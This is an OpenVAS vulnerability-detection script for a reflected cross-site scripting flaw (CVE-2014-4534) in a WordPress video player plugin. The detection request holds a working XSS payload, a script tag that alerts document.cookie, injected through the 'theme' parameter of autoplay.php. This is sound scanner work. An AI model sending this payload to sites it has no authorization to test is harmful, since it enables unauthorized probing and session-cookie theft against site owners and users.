###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_html5_videoplayer_plugin_mult_xss_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# WordPress HTML5 Video Player with Playlist plugin Multiple XSS Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804674");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2014-4534");
  script_bugtraq_id(68360);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-07-10 14:09:51 +0530 (Thu, 10 Jul 2014)");
  script_name("WordPress HTML5 Video Player with Playlist plugin Multiple XSS Vulnerabilities");


  script_tag(name:"summary", value:"This host is installed with Wordpress HTML5 Video Player with Playlist Plugin
and is prone to multiple cross site scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'theme' and 'playlistmod' HTTP GET parameters to autoplay.php
script is not properly sanitised before returning to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"WordPress HTML5 Video Player with Playlist Plugin version 2.4.0 and earlier");
  script_tag(name:"solution", value:"Upgrade to WordPress HTML5 Video Player with Playlist Plugin version 2.50 or
later. For updates refer
http://wordpress.org/plugins/html5-video-player-with-playlist/");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://codevigilant.com/disclosure/wp-plugin-html5-video-player-with-playlist-a3-cross-site-scripting-xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/html5-video-player-with-playlist/videopl' +
            'ayer/autoplay.php?theme="><script>alert(document.cookie)</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>",
   extra_check:">HTML5 VIDEO PLAYER<"))
{
  security_message(http_port);
  exit(0);
}
